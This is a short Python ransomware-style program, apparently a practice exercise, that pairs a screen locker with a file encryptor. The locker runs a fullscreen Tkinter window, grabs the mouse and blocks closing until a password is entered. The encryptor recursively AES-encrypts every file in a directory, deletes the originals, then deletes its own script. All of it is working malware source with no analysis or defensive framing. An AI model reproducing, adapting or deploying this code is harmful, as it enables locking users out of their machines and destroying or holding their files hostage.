import os, sys, pyAesCrypt
from threading import *
from pyautogui import click, moveTo
from tkinter import Tk,Entry,Label
from time import sleep


def locker():
	def callback(event):
		global k,entry
		if entry.get()=="123": k=True
	def block(void):
		click(675, 420)
		moveTo(675, 420)
		root.attributes("-fullscreen",True)
		root.protocol("WM_DELETE_WINDOW", block)
		root.update()
		root.bind('<Control-KeyPress-c>', callback)
	global k,entry
	root = Tk()
	root.title("Locker")
	root.attributes("-fullscreen",True)
	entry = Entry(root,font=1)
	label0=Label(root,text="Locker_by_#571",font=1)
	label0.grid(row=0,column=0)
	label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20')
	label1.place(x=470,y=300)
	entry.place(width=150,height=50,x=600,y=400)
	root.update(); sleep(100)
	click(675, 420)
	k = False
	while k != True:
        block(None)



def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)


def crypt(file):
    password = "123"
    bufferSize = 512 * 1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
    print("[crypted] '" + str(file) + ".crp'")
    os.remove(file)


def crypter():
    walk("/home/notebook/git/Projects/Practice8/")
    os.remove(str(sys.argv[0]))

#Запуск локера и шифровальщика в два потока
thread_1 = Thread(target=locker)
thread_2 = Thread(target=crypter)
thread_1.start()
thread_2.start()
thread_1.join()
thread_2.join()